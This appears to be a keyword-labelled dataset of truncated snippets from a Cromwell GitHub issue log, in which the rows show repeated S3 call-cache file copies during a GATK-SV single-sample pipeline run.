Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi; 1608596972311,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi; 1608596974147,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi; 1608596976528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:10050,cache,cacheCopy,10050,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi; 1608597629983,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi; 1608597632017,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz; 1608597635134,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:191685,cache,cacheCopy,191685,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi; 1608597076382,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi; 1608597078723,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz; 1608597081079,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:38109,cache,cacheCopy,38109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-49/cacheCopy/SR00c.HG02069.txt.gz.tbi; 1608597569034,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz.tbi; 1608597571205,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz; 1608597573618,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:176141,cache,cacheCopy,176141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi; 1608597495158,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi; 1608597497211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz; 1608597499938,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:154686,cache,cacheCopy,154686,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi; 1608597491461,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi; 1608597492748,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi; 1608597495158,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:153432,cache,cacheCopy,153432,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi; 1608597475239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi; 1608597478676,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz; 1608597480242,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:148471,cache,cacheCopy,148471,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi; 1608597386501,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi; 1608597387962,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi; 1608597391284,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:122247,cache,cacheCopy,122247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz.tbi; 1608597040452,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz.tbi; 1608597042942,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz; 1608597045131,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:28123,cache,cacheCopy,28123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz.tbi; 1608596996095,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi; 1608596998999,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz; 1608597001436,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:16908,cache,cacheCopy,16908,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi; 1608597384680,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi; 1608597386501,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi; 1608597387962,download: 